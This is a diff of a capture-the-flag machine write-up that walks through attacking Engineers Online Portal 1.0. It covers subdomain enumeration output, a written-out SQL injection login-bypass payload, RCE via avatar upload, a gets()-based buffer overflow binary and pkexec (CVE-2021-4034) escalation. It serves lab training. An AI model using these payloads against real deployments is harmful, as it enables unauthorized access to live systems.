@@ -2,7 +2,7 @@
 
 ## Introduction
 
-This is to introduce the multiple vulnerabilities in Engineers Online Portal 1.0 that could be chained together to reveal serious information, or even rce. Next, this box aims to tell why allowing mysql connection to remote host isn't a good idea. Finally, it takes a little buffer overflow skills to exploit a manually coded binary, and some basic knowledge of how CVE-2021-4034 works to escalate to root.
+This is to introduce the multiple vulnerabilities in Engineers Online Portal 1.0 that could be chained together to obtain rce. Next, this box aims to tell why allowing mysql connection to remote host isn't a good idea. Finally, it takes a little buffer overflow skills to exploit a manually coded binary, and some basic knowledge of how CVE-2021-4034 works to escalate to root.
 
 ## Info for HTB
 
@@ -29,9 +29,8 @@ Passwords:
 ### Other
 
 1. The online engineer portal is built using the original source code version 1.0. There's no deliberate manipulation of the source code to allow the further exploit done.
-2. There's two ways to gain foothold, but the first way is the intended one (as the mysql user) while the second unintended way (as www-data) is unable to escalate to root. This is because the vulnerable binary "mysql-into-cybercraze-group" only works to include mysql user into cybercraze group, which is intended for further exploitation.
-3. There's stored password in the binary "mysql-into-cybercraze-group", but it is made unreadable and hence using strings or downloading for local inspection will fail.
-4. source code for mysql-into-cybercraze-group
+2. There's stored password in the binary "mysql-into-cybercraze-group", but it is made unreadable and hence using strings or downloading for local inspection will fail.
+3. source code for mysql-into-cybercraze-group
 
             #include <stdio.h>
             #include <string.h>
@@ -66,9 +65,9 @@ Passwords:
             }
 *notice the vulnerable function gets() to read password is used, which is vulnerable to buffer overflow
 
-5. vulnerable /usr/bin/pkexec is moved to /opt/pkexec, where /opt is only readable and executable by user cybercraze
+4. vulnerable /usr/bin/pkexec is moved to /opt/pkexec, where /opt is only readable and executable by user cybercraze
 
-6. exploits refer to:
+5. exploits refer to:
 
 https://www.exploit-db.com/exploits/50452
 
@@ -114,22 +113,47 @@ https://github.com/berdav/CVE-2021-4034
             Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
             Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
 
-$gobuster vhost -u engineer.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:          http://engineer.htb
-[+] Method:       GET
-[+] Threads:      10
-[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
-[+] User Agent:   gobuster/3.1.0
-[+] Timeout:      10s
-===============================================================
-2022/04/05 14:33:56 Starting gobuster in VHOST enumeration mode
-===============================================================
-Found: webportal.engineer.htb (Status: 200) [Size: 9749]
-                                                        
-===============================================================
-2022/04/05 14:34:01 Finished
-===============================================================
+2. Basic Enumeration of index.html and found domain name engineer.htb via email address scattered in the page. (e.g info@engineer.htb, contact@engineer.htb) Edit /etc/hosts to add the domain name for the target ip.
+
+*first view of index.html:
+<img src=img/index.png>
+*email address ending with @engineer.htb
+<img src=img/email.png>
+
+3. There's no interesting port or web content. Use gobuster to enumerate for subdomains: (using subdomains wordlist provided by seclists)
+            $gobuster vhost -u engineer.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
+            ===============================================================
+            Gobuster v3.1.0
+            by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+            ===============================================================
+            [+] Url:          http://engineer.htb
+            [+] Method:       GET
+            [+] Threads:      10
+            [+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+            [+] User Agent:   gobuster/3.1.0
+            [+] Timeout:      10s
+            ===============================================================
+            2022/04/05 14:33:56 Starting gobuster in VHOST enumeration mode
+            ===============================================================
+            Found: webportal.engineer.htb (Status: 200) [Size: 9749]
+
+            ===============================================================
+            2022/04/05 14:34:01 Finished
+            ===============================================================
+
+4. first view reveals that the site hosts an online engineer's portal
+<img src=img/webportal.png>
+
+5. sql injection auth bypass in online engineer's portal v1.0
+
+*refer to https://www.exploit-db.com/exploits/50452
+
+bypass the login form authentication with sql payloads as follow:
+
+            username:' OR '1'='1';-- -
+            password:anystring
+
+6. rce via uploading avatar
+
+*refer to https://www.idappcom.co.uk/post/engineers-online-portal-1-0-remote-code-execution
+/teacher_avatar.php
